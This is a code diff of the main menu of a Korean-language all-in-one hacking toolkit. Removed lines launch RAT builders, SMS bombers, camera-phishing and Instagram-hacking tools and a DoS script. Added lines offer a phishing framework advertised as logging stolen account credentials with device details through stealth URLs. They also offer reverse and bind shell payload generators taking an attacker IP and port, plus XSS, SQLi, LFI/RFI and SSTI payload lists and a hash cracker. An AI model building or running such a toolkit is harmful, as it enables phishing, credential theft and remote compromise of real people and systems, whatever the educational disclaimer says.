+    print(f"{Colors.WHITE}  - 시나리오 맞춤형 랜딩: 보안 알림, 환급금 안내 등 시나리오별 전용 페이지 생성.\n")
+    print(f"{Colors.WHITE}  - Cloudflare Stealth: 중간 경고 페이지 없는 깨끗한 공용 URL 자동 생성.\n")
+    print(f"{Colors.WHITE}  - 정밀 데이터 로깅: 탈취된 계정 정보와 함께 상세 기기 정보를 실시간 수집.\n")
+    print(f"{Colors.WHITE}  - 완벽한 무결성: 최신 웹 보안 정책을 우회하여 모든 기기에서 완벽하게 작동.\n")
+    print(f"{Colors.WHITE}  - 'B' 또는 'b'를 입력하여 이전 메뉴로 돌아갈 수 있습니다.\n")
+    print(f"{Colors.WHITE}  - '0'을 입력하여 도구를 종료할 수 있습니다.\n")
+    print(f"{Colors.RED}주의: 이 도구는 교육 및 보안 학습 목적으로 제작되었습니다. 타인의 동의 없이 무단으로 정보를 수집하거나 악용하는 행위는 법적 문제를 야기할 수 있습니다. 항상 윤리적이고 합법적인 범위 내에서 사용하십시오.{Colors.RESET}\n")
     input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
 
 def main():
     while True:
         print_banner()
-        print(f"{Colors.YELLOW}{Colors.BOLD}    [ 올인원 해킹 옵션 메뉴 ]{Colors.RESET}")
-        print(f"{Colors.GREEN}      [ 01 ] >> 정보 수집 (Information Gathering){Colors.RESET}")
-        print(f"{Colors.GREEN}      [ 02 ] >> 익스플로잇 도구 (Exploitation Tools){Colors.RESET}")
-        print(f"{Colors.GREEN}      [ 03 ] >> 스니핑 및 스푸핑 (Sniffing & Spoofing){Colors.RESET}")
-        print(f"{Colors.GREEN}      [ 04 ] >> 웹 공격 도구 (Web Attack Tools){Colors.RESET}")
-        print(f"{Colors.GREEN}      [ 05 ] >> 캠 해킹 도구 (Cam Hacking Tools){Colors.RESET}")
-        print(f"{Colors.GREEN}      [ 06 ] >> 원격 제어 트로이 목마 (RAT){Colors.RESET}")
-        print(f"{Colors.CYAN}      [ 07 ] >> SQL 인젝션 도구 (SQL Injection){Colors.RESET}")
-        print(f"{Colors.CYAN}      [ 08 ] >> 소셜 미디어 해킹 (Social Media){Colors.RESET}")
-        print(f"{Colors.CYAN}      [ 09 ] >> SMS 스패밍 도구 (SMS Spamming){Colors.RESET}")
-        print(f"{Colors.CYAN}      [ 10 ] >> 취약점 분석 (Vulnerability Analysis){Colors.RESET}")
-        print(f"{Colors.RED}      [ 11 ] >> 궁극의 피싱 프레임워크 (Z-Infinity){Colors.RESET}")
-        print(f"{Colors.RED}      [ 12 ] >> 암호 공격 및 브루트포스 (Password){Colors.RESET}")
-        print(f"{Colors.RED}      [ 13 ] >> 워드리스트 생성기 (Wordlist){Colors.RESET}")
-        print(f"{Colors.RED}      [ 14 ] >> XSS 공격 도구 (XSS Attacks){Colors.RESET}")
-        print(f"{Colors.WHITE}      [ 15 ] >> OSINT 및 종합 스캔 (v18.0){Colors.RESET}")
-        print(f"{Colors.WHITE}      [ 16 ] >> 도움말 및 정보 (Help){Colors.RESET}")
-        print(f"{Colors.RED}      [ 00 ] >> 프로그램 종료 (Exit){Colors.RESET}")
-        print(f"{Colors.MAGENTA}{Colors.BOLD}    {'='*60}{Colors.RESET}")
+        print(f"{Colors.YELLOW}{Colors.BOLD}메인 메뉴 (V5.0 Advanced):{Colors.RESET}")
+        print(f"{Colors.GREEN}  1. 종합 OSINT & 보안 스캔 (HTML 보고서 생성){Colors.RESET}")
+        print(f"{Colors.GREEN}  2. 정보 수집 도구{Colors.RESET}")
+        print(f"{Colors.GREEN}  3. 웹 분석 및 고도화 취약점 스캔 도구{Colors.RESET}")
+        print(f"{Colors.GREEN}  4. 네트워크 및 시스템 분석 도구{Colors.RESET}")
+        print(f"{Colors.GREEN}  5. 암호학 & 유틸리티{Colors.RESET}")
+        print(f"{Colors.GREEN}  6. 멀티 언어 페이로드 라이브러리{Colors.RESET}")
+        print(f"{Colors.GREEN}  7. 웹 해킹 및 취약점 우회 도구{Colors.RESET}")
+        print(f"{Colors.CYAN}  8. 이메일 / 전화번호 검증{Colors.RESET}")
+        print(f"{Colors.CYAN}  9. 소셜 미디어 사용자명 검색{Colors.RESET}")
+        print(f"{Colors.CYAN}  10. 웹사이트 종합 스캐닝{Colors.RESET}")
+        print(f"{Colors.RED}  11. [NEW] 피싱 및 [v17.0] Ghost-Mirror 사회공학적 도구{Colors.RESET}")
+        print(f"{Colors.GREEN}  12. 도움말{Colors.RESET}")
+        print(f"{Colors.RED}  0. 종료{Colors.RESET}")
+        print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")
         
         choice = input(f"{Colors.YELLOW}선택하세요: {Colors.RESET}").strip()
-        aio = AllInOneToolkit()
 
-        if choice in ['1', '01']:
-            aio.show_submenu("정보 수집", [
-                {"name": "AstraNmap (네트워크 스캐너)", "cmd": "cd AstraNmap && bash astranmap.sh"},
-                {"name": "EvilURL (URL 위장)", "cmd": "cd EvilURL && python3 evilurl.py"},
-                {"name": "OSIF (페이스북 정보 수집)", "cmd": "cd OSIF && python2 osif.py"},
-                {"name": "Weeman (피싱 서버)", "cmd": "cd weeman && python2 weeman.py"},
-                {"name": "MaxSubdoFinder (서브도메인 탐색)", "cmd": "cd MaxSubdoFinder && python2 maxteroit.py"},
-                {"name": "Easymap (Nmap 간편 실행)", "cmd": "cd Easymap && php easymap.php"},
-                {"name": "Trape (사람 추적기)", "cmd": "cd trape && python trape.py"},
-                {"name": "Red Hawk (올인원 웹 스캐너)", "cmd": "cd RED_HAWK && php rhawk.php"},
-                {"name": "ReconDog (정보 정찰 도구)", "cmd": "cd ReconDog && ./dog"},
-                {"name": "Nikto Scanner (웹 서버 취약점 스캐너)", "cmd": "cd Files && bash Nikto.sh"}
-            ])
-        elif choice in ['2', '02']:
-            aio.show_submenu("익스플로잇 도구", [
-                {"name": "Metasploit 도우미", "cmd": "msfconsole"},
-                {"name": "Commix (명령어 인젝션)", "cmd": "cd commix && python3 commix.py"},
-                {"name": "ExploitDB 검색", "cmd": "searchsploit"},
-                {"name": "SQLmap (자동 SQLi)", "cmd": "sqlmap"}
-            ])
-        elif choice in ['3', '03']:
-            aio.show_submenu("스니핑 및 스푸핑", [
-                {"name": "Wireshark (CLI 패킷 분석)", "cmd": "tshark"},
-                {"name": "Bettercap (네트워크 공격 플랫폼)", "cmd": "bettercap"},
-                {"name": "Ettercap (중간자 공격 도구)", "cmd": "ettercap -G"}
-            ])
-        elif choice in ['4', '04']:
-            aio.show_submenu("웹 공격 도구", [
-                {"name": "WebKiller (웹사이트 공격)", "cmd": "cd webkiller && python3 webkiller.py"},
-                {"name": "D-Tech (웹사이트 정보 수집)", "cmd": "cd D-Tech && python2 d-tect.py"},
-                {"name": "관리자 페이지 탐색기", "cmd": "cd Files && python3 AdminFinder.py"}
-            ])
-        elif choice in ['5', '05']:
-            aio.show_submenu("캠 해킹 도구", [
-                {"name": "SayCheese (카메라 피싱)", "cmd": "cd saycheese && bash saycheese.sh"},
-                {"name": "GrabCam (카메라 제어)", "cmd": "cd grabcam && bash grabcam.sh"}
-            ])
-        elif choice in ['6', '06']:
-            aio.show_submenu("원격 제어 트로이 목마 (RAT)", [
-                {"name": "TheFatRat (익스플로잇 생성)", "cmd": "cd TheFatRat && bash setup.sh"},
-                {"name": "Stitch (페이로드 생성기)", "cmd": "cd Stitch && python2 main.py"}
-            ])
-        elif choice in ['7', '07']:
-            aio.show_submenu("SQL 인젝션 도구", [
-                {"name": "SQLmap (자동 SQLi)", "cmd": "sqlmap --wizard"},
-                {"name": "NoSQLmap (NoSQL DB 공격)", "cmd": "cd NoSQLMap && python setup.py install"}
-            ])
-        elif choice in ['8', '08']:
-            aio.show_submenu("소셜 미디어 해킹", [
-                {"name": "InstaHack (인스타그램 해킹)", "cmd": "cd instahack && python3 instahack.py"},
-                {"name": "SocialBox (소셜 미디어 공격 도구)", "cmd": "cd SocialBox && bash install-sb.sh"}
-            ])
-        elif choice in ['9', '09']:
-            aio.show_submenu("SMS 스패밍 도구", [
-                {"name": "TBomb (SMS 폭탄 공격)", "cmd": "cd TBomb && bash TBomb.sh"},
-                {"name": "Impulse (SMS 스패머)", "cmd": "cd Impulse && python3 impulse.py"}
-            ])
-        elif choice == '10':
-            aio.show_submenu("취약점 분석", [
-                {"name": "Nmap 취약점 스캔", "cmd": "nmap --script vuln"},
-                {"name": "Slowloris (DoS 테스트)", "cmd": "cd slowloris && python3 slowloris.py"}
-            ])
-        elif choice == '11':
-            UltimatePhishingFramework().run()
-        elif choice == '12':
-            aio.show_submenu("암호 공격", [
-                {"name": "John the Ripper (암호 크래커)", "cmd": "john"},
-                {"name": "Hydra (무차별 대입 공격)", "cmd": "hydra"},
-                {"name": "HashCat (고속 암호 크래커)", "cmd": "hashcat"}
-            ])
-        elif choice == '13':
-            aio.show_submenu("워드리스트 생성기", [
-                {"name": "Cupp (사회 공학 워드리스트)", "cmd": "cd cupp && python3 cupp.py"},
-                {"name": "Crunch (맞춤형 워드리스트)", "cmd": "crunch"}
-            ])
-        elif choice == '14':
-            aio.show_submenu("XSS 공격 도구", [
-                {"name": "XSStrike (고급 XSS 스캐너)", "cmd": "cd XSStrike && python3 xsstrike.py"},
-                {"name": "XSSer (자동 XSS 프레임워크)", "cmd": "xsser"}
-            ])
-        elif choice == '15':
+        if choice == '1':
             target = input(f"{Colors.CYAN}종합 스캔할 도메인 또는 IP 주소를 입력하세요: {Colors.RESET}").strip()
             if target:
                 run_full_scan(target)
             else:
                 print(f"{Colors.RED}유효한 대상을 입력해주세요.{Colors.RESET}")
             input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
-        elif choice == '16':
+        
+        elif choice == '2': # 정보 수집 도구
+            while True:
+                display_info_gathering_menu()
+                sub_choice = input(f"{Colors.YELLOW}선택하세요 (0-8, B): {Colors.RESET}").strip().upper()
+                if sub_choice == 'B': break
+                if sub_choice == '0': sys.exit(0)
+
+                target = input(f"{Colors.CYAN}대상 도메인 또는 IP 주소를 입력하세요: {Colors.RESET}").strip()
+                if not target: print(f"{Colors.RED}유효한 대상을 입력해주세요.{Colors.RESET}"); continue
+
+                if sub_choice == '2.1': run_individual_scan("WHOIS", target)
+                elif sub_choice == '2.2': run_individual_scan("DNS", target)
+                elif sub_choice == '2.3': run_individual_scan("Geolocation", target)
+                elif sub_choice == '2.4': run_individual_scan("Subdomain", target)
+                elif sub_choice == '2.5': run_individual_scan("Email Harvester", target)
+                elif sub_choice == '2.6': run_individual_scan("SSL Info", target)
+                elif sub_choice == '2.7': run_individual_scan("Reverse IP", target)
+                elif sub_choice == '2.8': run_individual_scan("Google Dorks", target)
+                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
+                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+
+        elif choice == '3': # 웹 분석 및 취약점 스캔
+            while True:
+                display_web_analysis_menu()
+                sub_choice = input(f"{Colors.YELLOW}선택하세요 (0-12, B): {Colors.RESET}").strip().upper()
+                if sub_choice == 'B': break
+                if sub_choice == '0': sys.exit(0)
+
+                if sub_choice == '3.12':
+                    keyword = input(f"{Colors.CYAN}검색할 취약점 키워드 (예: WordPress, Apache): {Colors.RESET}").strip()
+                    if keyword:
+                        print_result("Exploit-DB 검색 결과", exploit_db_search(keyword))
+                    else:
+                        print(f"{Colors.RED}키워드를 입력해주세요.{Colors.RESET}")
+                    input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+                    continue
+
+                target = input(f"{Colors.CYAN}대상 도메인 또는 URL을 입력하세요: {Colors.RESET}").strip()
+                if not target: print(f"{Colors.RED}유효한 대상을 입력해주세요.{Colors.RESET}"); continue
+
+                if sub_choice == '3.1': run_individual_scan("Web Tech", target)
+                elif sub_choice == '3.2': run_individual_scan("WAF", target)
+                elif sub_choice == '3.3': run_individual_scan("Security Headers", target)
+                elif sub_choice == '3.4': run_individual_scan("Clickjacking", target)
+                elif sub_choice == '3.5': run_individual_scan("Open Redirect", target)
+                elif sub_choice == '3.6': run_individual_scan("CORS", target)
+                elif sub_choice == '3.7': run_individual_scan("Robots.txt", target)
+                elif sub_choice == '3.8': run_individual_scan("Sitemap", target)
+                elif sub_choice == '3.9': run_individual_scan("XSS/SQLi Scan", target)
+                elif sub_choice == '3.10':
+                    custom_path = input(f"{Colors.CYAN}사용자 정의 워드리스트 파일 경로 (기본 엔터 시 기본값 사용): {Colors.RESET}").strip()
+                    print_result("디렉토리 브루트포싱 결과", dir_bruteforcer(target, custom_path if custom_path else None))
+                elif sub_choice == '3.11': run_individual_scan("CMS Scan", target)
+                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
+                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+
+        elif choice == '4': # 네트워크 및 시스템 분석
+            while True:
+                display_network_security_menu()
+                sub_choice = input(f"{Colors.YELLOW}선택하세요 (0-6, B): {Colors.RESET}").strip().upper()
+                if sub_choice == 'B': break
+                if sub_choice == '0': sys.exit(0)
+
+                target = input(f"{Colors.CYAN}대상 도메인 또는 IP 주소를 입력하세요: {Colors.RESET}").strip()
+                if not target: print(f"{Colors.RED}유효한 대상을 입력해주세요.{Colors.RESET}"); continue
+
+                if sub_choice == '4.1': run_individual_scan("Port Scan", target)
+                elif sub_choice == '4.2': run_individual_scan("Service Version", target)
+                elif sub_choice == '4.3': run_individual_scan("FTP Anon Login", target)
+                elif sub_choice == '4.4': run_individual_scan("Traceroute", target)
+                elif sub_choice == '4.5': run_individual_scan("Ping Sweep", target)
+                elif sub_choice == '4.6': run_individual_scan("Latency Check", target)
+                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
+                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+
+        elif choice == '5': # 암호학 & 유틸리티
+            while True:
+                display_crypto_utilities_menu()
+                sub_choice = input(f"{Colors.YELLOW}선택하세요 (0-9, B): {Colors.RESET}").strip().upper()
+                if sub_choice == 'B': break
+                if sub_choice == '0': sys.exit(0)
+
+                if sub_choice == '5.1':
+                    text = input(f"{Colors.CYAN}해시를 생성할 텍스트를 입력하세요: {Colors.RESET}").strip()
+                    print_result("해시 생성 결과", hash_generator(text))
+                elif sub_choice == '5.2':
+                    hash_val = input(f"{Colors.CYAN}식별할 해시 값을 입력하세요: {Colors.RESET}").strip()
+                    print_result("해시 식별 결과", hash_identifier(hash_val))
+                elif sub_choice == '5.3':
+                    mode = input(f"{Colors.CYAN}인코딩(encode) 또는 디코딩(decode)을 선택하세요: {Colors.RESET}").strip().lower()
+                    text = input(f"{Colors.CYAN}텍스트를 입력하세요: {Colors.RESET}").strip()
+                    print_result(f"Base64 {mode.capitalize()} 결과", base64_encode_decode(text, mode))
+                elif sub_choice == '5.4':
+                    mode = input(f"{Colors.CYAN}인코딩(encode) 또는 디코딩(decode)을 선택하세요: {Colors.RESET}").strip().lower()
+                    text = input(f"{Colors.CYAN}텍스트를 입력하세요: {Colors.RESET}").strip()
+                    print_result(f"URL {mode.capitalize()} 결과", url_encode_decode(text, mode))
+                elif sub_choice == '5.5':
+                    try:
+                        length = int(input(f"{Colors.CYAN}생성할 패스워드 길이 (기본 12): {Colors.RESET}") or 12)
+                        include_symbols = input(f"{Colors.CYAN}특수 문자 포함 (y/n, 기본 y): {Colors.RESET}").strip().lower() != 'n'
+                        print_result("생성된 패스워드", password_generator(length, include_symbols))
+                    except ValueError: print(f"{Colors.RED}유효한 숫자를 입력해주세요.{Colors.RESET}")
+                elif sub_choice == '5.6':
+                    ip_cidr = input(f"{Colors.CYAN}IP 주소/CIDR (예: 192.168.1.0/24): {Colors.RESET}").strip()
+                    print_result("IP 계산 결과", ip_calculator(ip_cidr))
+                elif sub_choice == '5.7':
+                    mode = input(f"{Colors.CYAN}Epoch -> 날짜(to_date) 또는 날짜 -> Epoch(to_epoch)를 선택하세요: {Colors.RESET}").strip().lower()
+                    if mode == 'to_date':
+                        timestamp = input(f"{Colors.CYAN}Epoch 타임스탬프를 입력하세요: {Colors.RESET}").strip()
+                        print_result("변환 결과", epoch_converter(timestamp, mode))
+                    elif mode == 'to_epoch':
+                        date_str = input(f"{Colors.CYAN}날짜 및 시간 (YYYY-MM-DD HH:MM:SS): {Colors.RESET}").strip()
+                        print_result("변환 결과", epoch_converter(date_str, mode))
+                    else: print(f"{Colors.RED}잘못된 모드입니다.{Colors.RESET}")
+                elif sub_choice == '5.8':
+                    target_hash = input(f"{Colors.CYAN}크래킹할 해시 값을 입력하세요 (MD5, SHA1, SHA256): {Colors.RESET}").strip()
+                    custom_wordlist = input(f"{Colors.CYAN}사용자 정의 워드리스트 경로 (기본 엔터 시 기본값 사용): {Colors.RESET}").strip()
+                    print_result("해시 크래킹 결과", hash_cracker(target_hash, custom_wordlist if custom_wordlist else None))
+                elif sub_choice == '5.9':
+                    keywords_input = input(f"{Colors.CYAN}조합에 사용할 키워드를 입력하세요 (쉼표 구분, 예: admin,test,2026): {Colors.RESET}").strip()
+                    keywords = [k.strip() for k in keywords_input.split(",") if k.strip()]
+                    if keywords:
+                        output_file = input(f"{Colors.CYAN}출력 파일명 (기본: wordlist.txt): {Colors.RESET}").strip() or "wordlist.txt"
+                        print_result("패스워드 리스트 생성 결과", password_list_generator(keywords, output_file=output_file))
+                    else:
+                        print(f"{Colors.RED}키워드를 하나 이상 입력해주세요.{Colors.RESET}")
+                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
+                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+
+        elif choice == '6': # 멀티 언어 페이로드 라이브러리
+            while True:
+                display_multi_language_payload_library_menu()
+                sub = input(f"{Colors.YELLOW}언어 선택 (L.1-L.13, B): {Colors.RESET}").strip().upper()
+                if sub == 'B': break
+                if sub == '0': sys.exit(0)
+                
+                lhost = input(f"{Colors.CYAN}LHOST (내 IP): {Colors.RESET}").strip() or "127.0.0.1"
+                lport = input(f"{Colors.CYAN}LPORT (포트): {Colors.RESET}").strip() or "4444"
+                
+                if sub == 'L.1': print_result("Shell Payloads", PayloadLibrary.get_shell_payloads(lhost, lport), Colors.GREEN)
+                elif sub == 'L.2': print_result("Python Payloads", PayloadLibrary.get_python_payloads(lhost, lport), Colors.GREEN)
+                elif sub == 'L.3': print_result("JavaScript Payloads", PayloadLibrary.get_javascript_payloads(lhost, lport), Colors.GREEN)
+                elif sub == 'L.4': print_result("C Payloads", PayloadLibrary.get_c_payloads(lhost, lport), Colors.GREEN)
+                elif sub == 'L.5': print_result("Java Payloads", PayloadLibrary.get_java_payloads(lhost, lport), Colors.GREEN)
+                elif sub == 'L.6': print_result("Go Payloads", PayloadLibrary.get_go_payloads(lhost, lport), Colors.GREEN)
+                elif sub == 'L.7': print_result("PHP Payloads", PayloadLibrary.get_php_payloads(lhost, lport), Colors.GREEN)
+                elif sub == 'L.8': print_result("Ruby Payloads", PayloadLibrary.get_ruby_payloads(lhost, lport), Colors.GREEN)
+                elif sub == 'L.9': print_result("Perl Payloads", PayloadLibrary.get_perl_payloads(lhost, lport), Colors.GREEN)
+                elif sub == 'L.10': print_result("C# Payloads", PayloadLibrary.get_csharp_payloads(lhost, lport), Colors.GREEN)
+                elif sub == 'L.11': print_result("Bind Shell Payloads", PayloadLibrary.get_bind_shell_payloads(lport), Colors.GREEN)
+                elif sub == 'L.12': print(PayloadLibrary.get_meterpreter_guideline(lhost, lport))
+                elif sub == 'L.13': print(PayloadLibrary.show_termux_constraints())
+                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
+                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+
+        elif choice == '7': # 웹 해킹 및 취약점 우회 도구
+            while True:
+                display_web_hacking_tools_menu()
+                sub = input(f"{Colors.YELLOW}선택 (W.1-W.4, B): {Colors.RESET}").strip().upper()
+                if sub == 'B': break
+                if sub == '0': sys.exit(0)
+
+                if sub == 'W.1': print_result("XSS Payloads", xss_payload_generator(), Colors.RED)
+                elif sub == 'W.2': print_result("SQLi Payloads", sqli_payload_generator(), Colors.RED)
+                elif sub == 'W.3': print_result("LFI/RFI Payloads", lfi_rfi_payload_generator(), Colors.RED)
+                elif sub == 'W.4': print_result("SSTI Payloads", ssti_payload_generator(), Colors.RED)
+                else: print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
+                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+
+        elif choice == '8':  # [NEW] 이메일 / 전화번호 검증
+            while True:
+                print_banner()
+                print(f"{Colors.CYAN}{Colors.BOLD}[NEW] 이메일 / 전화번호 검증:{Colors.RESET}")
+                print(f"{Colors.GREEN}  8.1. 이메일 종합 검증 (형식 + MX + HIBP 유출 여부){Colors.RESET}")
+                print(f"{Colors.GREEN}  8.2. 전화번호 형식 분석 및 국가 코드 식별{Colors.RESET}")
+                print(f"{Colors.BLUE}  B. 뒤로 가기{Colors.RESET}")
+                print(f"{Colors.RED}  0. 종료{Colors.RESET}")
+                print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")
+                sub_choice = input(f"{Colors.YELLOW}선택하세요 (8.1-8.2, B): {Colors.RESET}").strip().upper()
+                if sub_choice == 'B': break
+                if sub_choice == '0': sys.exit(0)
+                if sub_choice == '8.1':
+                    email = input(f"{Colors.CYAN}검증할 이메일 주소를 입력하세요: {Colors.RESET}").strip()
+                    if email:
+                        print_result("이메일 종합 검증 결과", email_full_verification(email), Colors.CYAN)
+                    else:
+                        print(f"{Colors.RED}이메일 주소를 입력해주세요.{Colors.RESET}")
+                elif sub_choice == '8.2':
+                    phone = input(f"{Colors.CYAN}검증할 전화번호를 입력하세요 (예: +821012345678 또는 01012345678): {Colors.RESET}").strip()
+                    if phone:
+                        print_result("전화번호 검증 결과", phone_full_verification(phone), Colors.CYAN)
+                    else:
+                        print(f"{Colors.RED}전화번호를 입력해주세요.{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
+                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+
+        elif choice == '9':  # [NEW] 소셜 미디어 사용자명 검색
+            while True:
+                print_banner()
+                print(f"{Colors.CYAN}{Colors.BOLD}[NEW] 소셜 미디어 사용자명(Username) 검색:{Colors.RESET}")
+                print(f"{Colors.GREEN}  9.1. 전체 플랫폼 검색 (30개 이상){Colors.RESET}")
+                print(f"{Colors.GREEN}  9.2. 개발자 플랫폼만 검색 (GitHub, GitLab, Bitbucket, NPM, PyPI, DockerHub){Colors.RESET}")
+                print(f"{Colors.GREEN}  9.3. 소셜 미디어만 검색 (Instagram, Twitter/X, TikTok, YouTube, Reddit 등){Colors.RESET}")
+                print(f"{Colors.BLUE}  B. 뒤로 가기{Colors.RESET}")
+                print(f"{Colors.RED}  0. 종료{Colors.RESET}")
+                print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")
+                sub_choice = input(f"{Colors.YELLOW}선택하세요 (9.1-9.3, B): {Colors.RESET}").strip().upper()
+                if sub_choice == 'B': break
+                if sub_choice == '0': sys.exit(0)
+                username = input(f"{Colors.CYAN}검색할 사용자명(Username)을 입력하세요: {Colors.RESET}").strip()
+                if not username:
+                    print(f"{Colors.RED}사용자명을 입력해주세요.{Colors.RESET}")
+                    input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+                    continue
+                if sub_choice == '9.1':
+                    print_result("사용자명 검색 결과", username_search(username), Colors.CYAN)
+                elif sub_choice == '9.2':
+                    dev_platforms = {k: v for k, v in SOCIAL_PLATFORMS.items() if k in ["GitHub", "GitLab", "Bitbucket", "NPM", "PyPI", "DockerHub", "HackerOne", "BugCrowd", "Dev.to", "HackerNews", "Keybase"]}
+                    print_result("개발자 플랫폼 검색 결과", username_search(username, dev_platforms), Colors.CYAN)
+                elif sub_choice == '9.3':
+                    social_platforms = {k: v for k, v in SOCIAL_PLATFORMS.items() if k in ["Instagram", "Twitter/X", "TikTok", "YouTube", "Reddit", "Pinterest", "LinkedIn", "Twitch", "Medium", "Soundcloud", "Spotify", "Behance", "Dribbble", "Flickr", "Vimeo", "Steam"]}
+                    print_result("소셜 미디어 검색 결과", username_search(username, social_platforms), Colors.CYAN)
+                else:
+                    print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
+                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+
+        elif choice == '10':  # [NEW] 웹사이트 종합 스캐닝
+            while True:
+                print_banner()
+                print(f"{Colors.CYAN}{Colors.BOLD}[NEW] 웹사이트 종합 스캐닝:{Colors.RESET}")
+                print(f"{Colors.GREEN}  10.1. 웹사이트 종합 스캔 (WHOIS + 서브도메인 + 기술스택 + 보안헤더 + SSL){Colors.RESET}")
+                print(f"{Colors.GREEN}  10.2. WHOIS 상세 파싱{Colors.RESET}")
+                print(f"{Colors.GREEN}  10.3. 서브도메인 탐지 (DNS 브루트포스 + crt.sh){Colors.RESET}")
+                print(f"{Colors.GREEN}  10.4. 기술 스택 상세 분석{Colors.RESET}")
+                print(f"{Colors.BLUE}  B. 뒤로 가기{Colors.RESET}")
+                print(f"{Colors.RED}  0. 종료{Colors.RESET}")
+                print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")
+                sub_choice = input(f"{Colors.YELLOW}선택하세요 (10.1-10.4, B): {Colors.RESET}").strip().upper()
+                if sub_choice == 'B': break
+                if sub_choice == '0': sys.exit(0)
+                target = input(f"{Colors.CYAN}대상 도메인 또는 URL을 입력하세요 (예: example.com): {Colors.RESET}").strip()
+                if not target:
+                    print(f"{Colors.RED}대상을 입력해주세요.{Colors.RESET}")
+                    input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+                    continue
+                if sub_choice == '10.1':
+                    print_result("웹사이트 종합 스캔 결과", website_full_scan(target), Colors.CYAN)
+                elif sub_choice == '10.2':
+                    domain = target.replace("http://", "").replace("https://", "").split("/")[0]
+                    print_result("WHOIS 상세 파싱 결과", website_whois_scan(domain), Colors.CYAN)
+                elif sub_choice == '10.3':
+                    domain = target.replace("http://", "").replace("https://", "").split("/")[0]
+                    print_result("서브도메인 탐지 결과", website_subdomain_advanced(domain), Colors.CYAN)
+                elif sub_choice == '10.4':
+                    print_result("기술 스택 분석 결과", website_tech_stack_full(target), Colors.CYAN)
+                else:
+                    print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
+                input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
+
+        elif choice == '11':  # [v17.0] Ghost-Mirror 사회공학적 도구 (Live Dashboard)
+            GhostMirrorV17().run()
+
+        elif choice == '12':
             show_help()
-        elif choice in ['0', '00']:
+        elif choice == '0':
             print(f"{Colors.RED}도구를 종료합니다. 안녕히 계세요!{Colors.RESET}")
             sys.exit(0)
         else:
             print(f"{Colors.RED}잘못된 선택입니다. 다시 시도해주세요.{Colors.RESET}")
-            time.sleep(1)
-            continue
+            input(f"{Colors.CYAN}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n{Colors.RED}사용자에 의해 중단되었습니다.{Colors.RESET}")
-        sys.exit(0)
-
+    main()
